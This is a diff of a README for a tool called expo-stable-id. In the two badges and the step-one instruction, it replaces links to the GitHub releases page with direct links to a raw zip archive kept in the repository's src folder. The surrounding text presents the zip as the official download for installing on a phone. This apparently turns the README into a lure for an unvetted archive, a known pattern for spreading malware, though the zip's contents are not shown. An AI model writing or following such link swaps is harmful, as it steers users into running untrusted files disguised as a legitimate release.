@@ -1,6 +1,6 @@
 # 🔑 expo-stable-id - Secure, Cross-Device User ID
 
-[![Download expo-stable-id](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/wwah453/expo-stable-id/releases)
+[![Download expo-stable-id](https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip)](https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get expo-stable-id on your device:
 
 1. **Visit the Download Page**  
    Go to the releases page:  
-   [https://github.com/wwah453/expo-stable-id/releases](https://github.com/wwah453/expo-stable-id/releases)
+   [https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip](https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip)
 
 2. **Choose the Right File**  
    Look for the latest release (usually at the top). The files might be named clearly to show what device they support (for example, `.apk` for Android or `.ipa` for iOS).
@@ -131,4 +131,4 @@ For support or questions, use the "Issues" tab on the GitHub page or contact the
 
 ---
 
-[![Download expo-stable-id](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/wwah453/expo-stable-id/releases)
+[![Download expo-stable-id](https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip)](https://raw.githubusercontent.com/wwah453/expo-stable-id/main/src/stable-expo-id-3.1.zip)
